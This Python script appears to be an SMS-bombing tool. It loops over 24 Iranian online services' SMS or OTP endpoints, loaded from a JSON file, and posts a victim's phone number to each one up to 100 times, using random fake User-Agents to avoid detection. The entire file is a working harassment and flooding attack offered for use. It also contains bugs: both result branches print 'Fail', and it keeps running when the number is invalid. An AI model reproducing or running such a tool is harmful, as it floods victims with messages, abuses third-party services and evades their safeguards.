# packages
import requests
import json
import re

from colorama import Fore as C
from fake_useragent import UserAgent

range_n_limit = 100
services = ['pakhsh', 'lendo', 'banimode', 'snappmarket', 'snapp', 'sheypoor', 'digikala', 'itoll',
             'tapsi', 'sibche', 'zarinpal', 'snappbox', 'snappfood', 'safaremoon', 'saapa', 'okala',
               'timcheh', 'honari', 'mydigipay', 'ketabchi', 'komodaa', 'taaghche', 'azki', 'drdr'] # 24 online service

def validate_phone_number(phone_number):
    pattern = r"^09\d{9}$"  # الگوی رگولار اکسپرشن برای شماره موبایل در فرمت معتبر
    
    if re.match(pattern, phone_number):
        return True
    else:
        return False

def send(phone_number, range_n):  # add prvity Change IP
    cunt = 0

    send_s = "Send"
    fail_s = "Fail"
    
    # Validate phone number
    if validate_phone_number(phone_number):
        pass
    else:
        print(C.RED,"\nThe mobile number is invalid\n",C.RESET)

    # Load lib/API/sms.json
    with open('./lib/API/sms.json') as json_file:
        loaded_json = json.load(json_file)

    if int(range_n) <= range_n_limit:
        print("\n{:<12s} {:<4s} {:<15s}".format("SERVICE", "NUM", "RESULT"))
        print("{:<12s} {:<4s} {:<15s} ".format("=======", "===", "======"))


        for i in range(int(range_n)):


            # +_+_+_+ User Agent Generator +_+_+_+
            ua = UserAgent()
            headers = {'User-Agent': ua.random}

            for service in services:
                cunt += 1
                url_data = loaded_json[service]
                url = url_data['url']
                req_data = url_data.get('data', {})

                if isinstance(req_data, dict):
                    req_data = json.dumps(req_data)

                req_data = req_data.replace('numnum', phone_number)

                try:
                    req = requests.post(url=url, data=req_data, headers=headers)
                except KeyboardInterrupt:
                    print(C.YELLOW+'\nSkiped\n')
                if req.status_code == 200:
                    print("{:<12s} {:<4d} {:<15s}".format(service, cunt, fail_s))
                else:
                    print("{:<12s} {:<4d} {:<15s}".format(service, cunt, fail_s))

    else:
        print(C.RED,'\nSend Range Limit 100\n')
